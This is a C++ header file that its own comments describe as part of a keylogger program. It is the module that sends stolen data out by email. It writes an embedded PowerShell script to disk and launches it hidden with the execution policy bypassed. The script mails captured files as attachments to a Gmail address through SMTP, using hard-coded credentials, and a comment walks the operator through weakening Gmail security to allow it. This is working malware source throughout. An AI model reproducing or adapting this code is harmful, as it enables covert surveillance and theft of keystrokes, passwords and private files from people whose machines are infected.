#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include "Timer.h"
#include "windows.h"
#include "IO.h"
#include "Helper.h"


#define SCRIPT_NAME "sm.ps1"

namespace Mail
{
    /*
    YOU SHOULD LET YOUR SENDER & RECEIVER EMAIL IS 1
    BEFORE USING YOUR GMAIL FOR KEYLOGGER PROGRAM. PLEASE DO THE FOLLOWING STEPS:
        1/ LOG ON TO YOUR GMAIL ACCOUNT.
        2/ GO ONLINE SEARCH FOR: "google less secure apps"
        3/ PRETTY MUCH CHOOSE THE FIRST OUTCOME: support.google.com/....
        4/ SCROLL DOWN & CHOOSE THE "Less secure apps section"
        5/ CLICK ON "Access for less secure apps" -> "Turn on"
        6/ SHOULD GIVE IT 10 MINUTES TO CHECK & UPDATE THE GMAIL STATUS.
    */
    #define X_EM_TO "...@gmail.com"     //MUST BE A GMAIL
    #define X_EM_FROM "...@gmail.com"
    #define X_EM_PASS "..."      //BE CAREFUL WITH THIS

const std::string &PowerShellScript =
"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
"  ForEach ($val in $Attachments)\r\n                    "
"        {\r\n               "
"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
"}\r\n                catch\r\n                    {\r\n                        exit 2; "
"\r\n                    }\r\n            }\r\n "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
"Send-EMail -attachment $Att "
"-To \"" +
 std::string (X_EM_TO) +
 "\""
" -Body $Body -Subject $Subj "
"-password \"" +
 std::string (X_EM_PASS) +
  "\""
" -From \"" +
 std::string (X_EM_FROM) +
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

//To protect the string, context, the letter
#undef X_EM_FROM
#undef X_EM_TO
#undef X_EM_PASS

    std::string StringReplace(std::string s, const std::string &what, const std::string &with)
    {
    //s: string itself
    //what: string what we looking in its string
    //with: replace &with to &what has found
        if(what.empty())
            return s;
        size_t sp = 0;  //will iterator in the string: sp = string position

        while((sp = s.find(what, sp)) != std::string::npos)
            s.replace(sp, what.length(), with), sp += with.length();
        return s;
    }

    bool CheckFileExists(const std::string &f)
    {
        std::ifstream file(f);
        return (bool) file;
    }

    bool CreateScript()
    {
        std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));

        if(!script)
            return false;
        script << PowerShellScript;

        if(!script)
            return false;

        script.close();

        return true;
    }

    Timer m_timer;      //which we will use to set email timer

    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
    {
        bool ok;    //Check the script already exists, verify it !!

        ok = IO::MKDir(IO::GetOurPath(true));
        if(!ok)
            return -1;  //we cant create the direction
        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME); //GET the path + file name
        if(!CheckFileExists(scr_path))
            ok = CreateScript();

        if (!ok)
            return -2;  //Error code:

        /*
        HOW TO BYPASS Powershell - Policy Bypass
        Powershell by default will required the administrator execution
        We will need to find a way to bypass this => HOW TO DO THAT
        There is a default flag, you can pass on to the powershell to run without administrator
        */

        //MUST CODE AS FOLLOWING BECAUSE IT'S REALLY LONG & COMPLICATED. If it has error, it wont throw
        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                            + StringReplace(subject, "\"", "\\\"") +
                            "\" -Body \""
                            + StringReplace(body, "\"", "\\\"") +
                            "\" -Att \"" + attachments + "\"";

        //Create Shell structure info from the WINDOWS API
        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);        //fill in the size of the structure
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;         //Prevent the Powershell terminated thing immediately => to debugging
        ShExecInfo.hwnd = NULL;                             //Prevent Powershell from pop-up the window
        ShExecInfo.lpVerb = "open";                         //action to act: OPEN
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;                      //Working directory
        ShExecInfo.nShow = SW_HIDE;                         //Prevent from create window
        ShExecInfo.hInstApp = NULL;

        ok = (bool)ShellExecuteEx(&ShExecInfo);         //TO VERIFY: this can be execute
        if(!ok)
            return -3;

        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        m_timer.SetFunction([&]()   //THE unnamed function in C++11 = lambda FUNCTION
                                    //to get access into everything SendMail function
        {
            WaitForSingleObject(ShExecInfo.hProcess, 60000);    //Wait for 60 mins
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            if((int)exit_code == STILL_ACTIVE)
                TerminateProcess(ShExecInfo.hProcess, 100);
            Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
        });

        m_timer.RepeatCount(1L);
        m_timer.SetInterval(10L);
        m_timer.Start(true);
        return (int)exit_code;
    }

    //Overload the SendMail function to send attachments as many as I want
    int SendMail(const std::string &subject, const std::string &body, std::vector<std::string> &att)
    {
        std::string attachments = "";
        if(att.size() == 1U)    //1U: 1 unsigned integer => Only 1 attachment
            attachments = att.at(0);
        else
        {
            for(const auto &v : att)
                attachments += v + "::";
            attachments = attachments.substr(0, attachments.length() - 2);
        }
        return SendMail(subject, body, attachments);
    }
}
#endif // SENDMAIL_H
